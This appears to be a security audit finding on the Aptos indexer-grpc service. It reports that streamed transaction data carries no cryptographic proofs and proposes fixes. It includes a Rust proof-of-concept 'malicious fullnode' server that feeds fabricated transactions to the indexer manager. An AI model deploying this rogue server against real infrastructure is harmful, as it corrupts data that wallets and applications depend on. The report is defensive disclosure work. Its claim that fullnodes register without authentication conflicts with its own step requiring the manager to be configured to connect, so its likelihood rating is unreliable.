# Audit Report

## Title
Lack of Cryptographic Verification in Indexer-GRPC TransactionsFromNodeResponse Messages Allows Data Injection

## Summary
The `TransactionsFromNodeResponse` messages in the Aptos indexer-grpc system lack cryptographic verification, enabling malicious fullnodes or man-in-the-middle attackers to inject fabricated transaction data into the indexer infrastructure. This compromises data integrity for all downstream indexing services and applications relying on indexer APIs.

## Finding Description

The indexer-grpc system serves historical blockchain data to indexers through a multi-tier architecture. The critical vulnerability exists in how transaction data flows from fullnodes to the indexer-grpc-manager and ultimately to indexer clients, with NO cryptographic verification at any stage.

**Vulnerability Chain:**

1. **Protobuf Definition Lacks Proofs**: The `TransactionsFromNodeResponse` message only contains raw transaction data without accumulator proofs or cryptographic commitments. [1](#0-0) 

2. **Server Creates Unverified Responses**: The fullnode data service creates responses with only transaction data and chain_id, no cryptographic proofs. [2](#0-1) 

3. **Client Accepts Without Verification**: The indexer-grpc-manager receives and caches transactions without any verification. [3](#0-2) 

4. **Unauthenticated Fullnode Registration**: Any service can register as a fullnode by sending heartbeats, with no authentication mechanism. [4](#0-3) 

5. **Unverified Data Served to Clients**: The cached data is served to indexer clients without verification. [5](#0-4) 

**Attack Scenarios:**

**Scenario A: Malicious Fullnode Registration**
1. Attacker deploys a malicious gRPC service mimicking the FullnodeData interface
2. Sends heartbeat messages to indexer-grpc-manager claiming to be a legitimate fullnode
3. Manager accepts registration without authentication and creates a client connection [6](#0-5) 

4. When selected for requests, malicious service sends fabricated `TransactionsFromNodeResponse` messages with fake transactions
5. Data manager caches the fake transactions
6. All downstream indexers receive and process the fake data

**Scenario B: Man-in-the-Middle Attack**
1. Attacker intercepts gRPC stream between legitimate fullnode and indexer-grpc-manager
2. Modifies `TransactionsFromNodeResponse` messages in transit
3. Injects fake transactions or alters existing ones
4. Modified data is cached and propagated to all indexer clients

**Contrast with Proper Verification:**

Aptos uses `TransactionListWithProof` with accumulator proofs for secure state synchronization, but the indexer-grpc system bypasses this entirely: [7](#0-6) 

The deserialization function performs NO cryptographic verification - it only parses the protobuf structure.

## Impact Explanation

**Severity: HIGH**

While this vulnerability does NOT directly affect consensus, validator operations, or fund custody on the blockchain itself, it represents a **significant protocol violation** in the indexer infrastructure with serious downstream consequences:

**Direct Impacts:**
1. **Indexer Data Corruption**: All indexers consuming from compromised indexer-grpc-manager receive fake transaction data
2. **State Inconsistency**: Indexer databases become inconsistent with actual blockchain state
3. **Service Disruption**: Applications relying on indexer APIs malfunction due to incorrect data

**Indirect Impacts:**
1. **User Fund Loss**: Wallets/exchanges using indexer APIs for balance queries may display incorrect balances, leading to erroneous transactions
2. **Oracle Manipulation**: DeFi protocols using indexer data for price feeds or event monitoring can be manipulated
3. **Audit Trail Corruption**: Historical transaction queries return fake data, compromising forensic analysis

**Why Not Critical:**
- Does not affect blockchain consensus or validator operations
- Does not enable direct theft or minting of on-chain funds
- Does not cause network partition or liveness failures
- Limited to indexer infrastructure, not core protocol

**Why HIGH:**
- Significant protocol violation in a production system serving critical infrastructure
- Affects all downstream consumers of indexer data
- Can indirectly enable fund loss through application logic errors
- Compromises data integrity guarantees

## Likelihood Explanation

**Likelihood: HIGH**

**Attack Feasibility:**
1. **Low Technical Barrier**: Implementing a malicious gRPC service is straightforward
2. **No Authentication Required**: Any service can register as a fullnode
3. **No Ongoing Verification**: Once registered, no mechanism detects fake data
4. **Wide Attack Surface**: Multiple entry points (malicious registration, MITM, compromised fullnode)

**Detection Difficulty:**
- No built-in integrity checking to detect fake transactions
- Fake data propagates silently through the system
- Downstream applications have no way to verify data authenticity
- May only be discovered when compared against direct blockchain queries

**Attacker Motivation:**
- Manipulate indexer-dependent applications (wallets, exchanges, analytics)
- Create confusion and erode trust in Aptos ecosystem
- Enable social engineering attacks with "proof" of fake transactions

## Recommendation

**Immediate Fixes:**

1. **Include Accumulator Proofs**: Modify `TransactionsFromNodeResponse` to include `TransactionInfoListWithProof` with accumulator range proofs, similar to state-sync:

```protobuf
message TransactionsOutput {
  repeated aptos.transaction.v1.Transaction transactions = 1;
  // ADD: Cryptographic proof binding transactions to ledger state
  aptos.types.v1.TransactionInfoListWithProof proof = 2;
  // ADD: Ledger info signed by validators
  aptos.types.v1.LedgerInfoWithSignatures ledger_info = 3;
}
```

2. **Verify Proofs on Receipt**: Add verification logic in `DataManager::put_transactions`:

```rust
// Before caching, verify the proof
if let Some(proof) = data.proof {
    proof.verify(
        trusted_ledger_info,
        Some(start_version),
        data.transactions.len()
    ).map_err(|e| anyhow!("Proof verification failed: {}", e))?;
}
self.cache.write().await.put_transactions(data.transactions);
```

3. **Authenticate Fullnode Registration**: Implement mutual TLS with certificate validation or use network identity framework to authenticate fullnodes before registration.

4. **Add Integrity Monitoring**: Implement periodic spot-checks comparing cached data against direct blockchain queries to detect inconsistencies.

**Long-term Solutions:**
- Unify indexer data service with state-sync architecture
- Use trusted ledger info chain with validator signatures
- Implement content-addressed storage with cryptographic commitments

## Proof of Concept

**Malicious Fullnode Server:**

```rust
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_server::{FullnodeData, FullnodeDataServer},
    TransactionsFromNodeResponse, TransactionsOutput, StreamStatus,
    GetTransactionsFromNodeRequest, PingFullnodeRequest, PingFullnodeResponse,
    stream_status::StatusType, transactions_from_node_response,
};
use aptos_protos::transaction::v1::Transaction;
use tonic::{transport::Server, Request, Response, Status};
use futures::Stream;
use std::pin::Pin;

struct MaliciousFullnode;

#[tonic::async_trait]
impl FullnodeData for MaliciousFullnode {
    type GetTransactionsFromNodeStream = 
        Pin<Box<dyn Stream<Item = Result<TransactionsFromNodeResponse, Status>> + Send>>;

    async fn get_transactions_from_node(
        &self,
        request: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        let (tx, rx) = tokio::sync::mpsc::channel(10);
        
        tokio::spawn(async move {
            // Send INIT status
            let init = TransactionsFromNodeResponse {
                chain_id: 1, // Mainnet chain ID
                response: Some(transactions_from_node_response::Response::Status(
                    StreamStatus {
                        r#type: StatusType::Init as i32,
                        start_version: 0,
                        end_version: None,
                    }
                )),
            };
            let _ = tx.send(Ok(init)).await;
            
            // Send FAKE transaction data - completely fabricated!
            let fake_transaction = Transaction {
                version: 12345,
                // ... populate with fake data ...
                ..Default::default()
            };
            
            let fake_data = TransactionsFromNodeResponse {
                chain_id: 1,
                response: Some(transactions_from_node_response::Response::Data(
                    TransactionsOutput {
                        transactions: vec![fake_transaction],
                    }
                )),
            };
            let _ = tx.send(Ok(fake_data)).await;
            
            // Send BATCH_END status
            let end = TransactionsFromNodeResponse {
                chain_id: 1,
                response: Some(transactions_from_node_response::Response::Status(
                    StreamStatus {
                        r#type: StatusType::BatchEnd as i32,
                        start_version: 0,
                        end_version: Some(12345),
                    }
                )),
            };
            let _ = tx.send(Ok(end)).await;
        });
        
        Ok(Response::new(Box::pin(tokio_stream::wrappers::ReceiverStream::new(rx))))
    }

    async fn ping(
        &self,
        _request: Request<PingFullnodeRequest>,
    ) -> Result<Response<PingFullnodeResponse>, Status> {
        Ok(Response::new(PingFullnodeResponse {
            info: Some(aptos_protos::indexer::v1::FullnodeInfo {
                chain_id: 1,
                known_latest_version: Some(999999),
                timestamp: None,
            }),
        }))
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Start malicious fullnode on port 50051
    let addr = "0.0.0.0:50051".parse()?;
    let service = MaliciousFullnode;
    
    println!("Malicious fullnode listening on {}", addr);
    println!("Indexer-grpc-manager will accept this without authentication!");
    println!("All fake transaction data will be cached and served to clients!");
    
    Server::builder()
        .add_service(FullnodeDataServer::new(service))
        .serve(addr)
        .await?;
    
    Ok(())
}
```

**Attack Execution:**
1. Deploy malicious fullnode: `cargo run --bin malicious-fullnode`
2. Configure indexer-grpc-manager to connect to malicious fullnode address
3. Manager registers it without authentication
4. When selected for requests, fake data is cached
5. All downstream indexers receive fabricated transactions

**Verification:**
- Query indexer API for transaction 12345
- Returns the fake transaction data that never existed on-chain
- Compare with direct blockchain query - data doesn't match
- Data integrity is completely compromised

---

**Notes:**
- This vulnerability is specific to the indexer-grpc infrastructure, not consensus validators
- The attack does NOT affect on-chain state or validator operations
- Impact is limited to off-chain indexing services and applications relying on them
- Proper fix requires architectural changes to include cryptographic proofs similar to state-sync
- TLS alone is insufficient - authenticates the transport, not the data authenticity

### Citations

**File:** protos/proto/aptos/internal/fullnode/v1/fullnode_data.proto (L18-20)
```text
message TransactionsOutput {
  repeated aptos.transaction.v1.Transaction transactions = 1;
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L187-194)
```rust
                        let item = TransactionsFromNodeResponse {
                            response: Some(transactions_from_node_response::Response::Data(
                                TransactionsOutput {
                                    transactions: chunk,
                                },
                            )),
                            chain_id: ledger_chain_id as u32,
                        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/data_manager.rs (L261-266)
```rust
                                Response::Data(data) => {
                                    trace!(
                                        "Putting data into cache, {} transaction(s).",
                                        data.transactions.len()
                                    );
                                    self.cache.write().await.put_transactions(data.transactions);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L67-80)
```rust
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .connect_lazy();
        let client = FullnodeDataClient::new(channel)
            .send_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Zstd)
            .max_encoding_message_size(MAX_MESSAGE_SIZE)
            .max_decoding_message_size(MAX_MESSAGE_SIZE);
        Self {
            client,
            recent_states: VecDeque::new(),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L533-549)
```rust
    fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
        let mut entry = self
            .fullnodes
            .entry(address.clone())
            .or_insert(Fullnode::new(address.clone()));
        entry.value_mut().recent_states.push_back(info);
        if let Some(known_latest_version) = info.known_latest_version {
            trace!(
                "Received known_latest_version ({known_latest_version}) from fullnode {address}."
            );
            self.update_known_latest_version(known_latest_version);
        }
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L134-145)
```rust
        let transactions = self
            .data_manager
            .get_transactions(request.starting_version(), MAX_SIZE_BYTES_FROM_CACHE)
            .await
            .map_err(|e| Status::internal(format!("{e}")))?;

        Ok(Response::new(TransactionsResponse {
            transactions,
            chain_id: Some(self.chain_id),
            // Not used.
            processed_range: None,
        }))
```

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.serde.rs (L521-617)
```rust
impl<'de> serde::Deserialize<'de> for TransactionsFromNodeResponse {
    #[allow(deprecated)]
    fn deserialize<D>(deserializer: D) -> std::result::Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        const FIELDS: &[&str] = &[
            "chain_id",
            "chainId",
            "status",
            "data",
        ];

        #[allow(clippy::enum_variant_names)]
        enum GeneratedField {
            ChainId,
            Status,
            Data,
        }
        impl<'de> serde::Deserialize<'de> for GeneratedField {
            fn deserialize<D>(deserializer: D) -> std::result::Result<GeneratedField, D::Error>
            where
                D: serde::Deserializer<'de>,
            {
                struct GeneratedVisitor;

                impl<'de> serde::de::Visitor<'de> for GeneratedVisitor {
                    type Value = GeneratedField;

                    fn expecting(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
                        write!(formatter, "expected one of: {:?}", &FIELDS)
                    }

                    #[allow(unused_variables)]
                    fn visit_str<E>(self, value: &str) -> std::result::Result<GeneratedField, E>
                    where
                        E: serde::de::Error,
                    {
                        match value {
                            "chainId" | "chain_id" => Ok(GeneratedField::ChainId),
                            "status" => Ok(GeneratedField::Status),
                            "data" => Ok(GeneratedField::Data),
                            _ => Err(serde::de::Error::unknown_field(value, FIELDS)),
                        }
                    }
                }
                deserializer.deserialize_identifier(GeneratedVisitor)
            }
        }
        struct GeneratedVisitor;
        impl<'de> serde::de::Visitor<'de> for GeneratedVisitor {
            type Value = TransactionsFromNodeResponse;

            fn expecting(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
                formatter.write_str("struct aptos.internal.fullnode.v1.TransactionsFromNodeResponse")
            }

            fn visit_map<V>(self, mut map: V) -> std::result::Result<TransactionsFromNodeResponse, V::Error>
                where
                    V: serde::de::MapAccess<'de>,
            {
                let mut chain_id__ = None;
                let mut response__ = None;
                while let Some(k) = map.next_key()? {
                    match k {
                        GeneratedField::ChainId => {
                            if chain_id__.is_some() {
                                return Err(serde::de::Error::duplicate_field("chainId"));
                            }
                            chain_id__ =
                                Some(map.next_value::<::pbjson::private::NumberDeserialize<_>>()?.0)
                            ;
                        }
                        GeneratedField::Status => {
                            if response__.is_some() {
                                return Err(serde::de::Error::duplicate_field("status"));
                            }
                            response__ = map.next_value::<::std::option::Option<_>>()?.map(transactions_from_node_response::Response::Status)
;
                        }
                        GeneratedField::Data => {
                            if response__.is_some() {
                                return Err(serde::de::Error::duplicate_field("data"));
                            }
                            response__ = map.next_value::<::std::option::Option<_>>()?.map(transactions_from_node_response::Response::Data)
;
                        }
                    }
                }
                Ok(TransactionsFromNodeResponse {
                    chain_id: chain_id__.unwrap_or_default(),
                    response: response__,
                })
            }
        }
        deserializer.deserialize_struct("aptos.internal.fullnode.v1.TransactionsFromNodeResponse", FIELDS, GeneratedVisitor)
    }
```
